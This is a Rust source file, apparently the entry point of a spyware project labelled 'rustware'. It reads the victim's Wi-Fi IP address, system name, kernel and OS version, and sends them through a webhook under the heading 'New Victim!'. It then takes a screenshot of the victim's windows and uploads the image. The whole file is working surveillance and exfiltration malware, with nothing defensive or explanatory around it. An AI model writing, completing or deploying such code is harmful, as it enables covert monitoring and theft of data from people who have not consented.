use netif;
use crate::webhook_handler::{send_files, send_img_RGBA, send_message};
use sysinfo::{System};
use crate::screenshot_all::window_screenshot;

pub mod screenshot_all;

mod webhook_handler;


#[tokio::main]
async fn main() {

    // println!("{:?}", window_screenshot("all".to_string()));
    // send_files(screenshot_all::full_screenshot().as_str()).await;
    let mut ip  = String::new();
    for ifa in netif::up().unwrap() {
        if !ifa.address().is_loopback() {
            if ifa.name() == "Wi-Fi"{

                ip = ifa.address().to_string();
                break;
            }

        }
    }
    let r:send_message = send_message{
        title: format!("New Victim! IPv6: {}", {ip}),
        description: "".to_string(),
        author: Some("rustware".parse().unwrap()),
        footer: None,
        field_1: vec!["System Name".parse().unwrap(), System::name().unwrap()],
        field_2: vec!["System Kernel Version".parse().unwrap(), System::kernel_version().unwrap()],
        field_3: vec!["OS version".parse().unwrap(), System::os_version().unwrap()],
    };

    r.sendMessage().await;
    let v = window_screenshot(None);
    send_img_RGBA(v).await
}

fn initialize(){

}